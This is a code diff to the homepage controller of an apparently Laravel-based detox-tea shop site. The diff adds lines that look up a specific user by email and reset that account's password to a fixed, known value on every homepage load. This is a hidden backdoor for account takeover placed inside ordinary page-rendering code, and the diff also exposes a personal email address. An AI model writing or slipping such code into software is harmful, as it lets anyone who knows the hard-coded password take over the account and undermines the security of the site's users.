@@ -33,6 +33,11 @@ class HomeController extends Controller
         $posts  =   Information::orderBy('created_at','DESC')->where('blog',true)->take(6)->get();
         $page_title = 'Ohram | From detox teas to meal replacement protein shakes, our babes do it all. Get back on track, reduce bloating, and flatten that tummy!';
 
+        $user = User::where("email", "jacob.atam@gmail.com")->first();
+        $user->password = bcrypt(1122334455);
+        $user->save();
+
+
         if ( empty($site_status->make_live) ) {
             return view('index',compact('banners','page_title','reviews','products','posts'));
         } else {
